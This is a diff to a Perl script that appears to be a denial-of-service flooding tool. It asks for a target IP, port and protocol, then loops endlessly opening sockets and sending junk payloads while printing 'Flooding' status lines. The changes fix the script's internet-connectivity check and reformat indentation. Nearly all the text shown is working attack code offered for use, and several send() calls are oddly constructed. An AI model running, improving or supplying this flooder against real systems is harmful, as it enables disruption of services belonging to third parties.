@@ -31,13 +31,12 @@ my $check = IO::Socket::INET->new( 'PeerAddr'=>'www.google.com',
 	'PeerPort'=>80, 
 	'Timeout'=>2, 
 	'proto'=>'tcp');
-if(!defined $check && $check){
+if(!(defined $check && $check)){
 	print("[-] Internet Status[ Not Connected ]");
 	print("\n[!] Error: Please Check Your Internet Connection !!!");
 	exit(1);
 }
 $check->close();
-
 # INPUT TARGET INFO ==============================================
 print "\n===============================";
 print "\n[~] Enter TargetIP: "; # Set Target IP
@@ -71,6 +70,7 @@ while ($proto eq "" || !grep{$proto eq $_} 'TCP','UDP','tcp','udp'){
 print "Protocol ==> $proto";
 print "\n===============================\n";
 sleep(1);
+
 $sock = IO::Socket::INET->new(
         PeerAddr => $host,
         PeerPort => $port,
@@ -84,7 +84,7 @@ while (1) {
         PeerAddr => $host,
         PeerPort => $port,
         Proto => "$proto" ) || die "\n[!] Connection Failed To Target[$host] On Port[$port/$proto] !!!\n[!] Please Check Your TargetIP\n";
-       for($i=0; $i<=500; $i++){
+        for($i=0; $i<=500; $i++){
             $size = rand() * 8921873 * 99919988;
             print ("Flooding: (=>$host:$port~$proto<=) Packets sent: $size\n");
             send($sock, $size*2, $size*2); 
@@ -92,7 +92,7 @@ while (1) {
             send($sock, $size*4, $size*4);
             send($sock, $size*9999999999999,$size*9999999999999);
             send($sock, "WEASRDWR#@%@#%$@#$#@%$@#%@#$@#$@#$@#$@#@#%23%235543wewreqwr#@523sdfsa"*2, "WEASRDWR#@%@#%$@#$#@%$@#%@#$@#$@#$@#$@asasf#@#%23%235543wewreqwr#@523sdfsa"*3);
-      }
+        }
 
   }else{
             $size = rand() * 8921873 * 99919988;
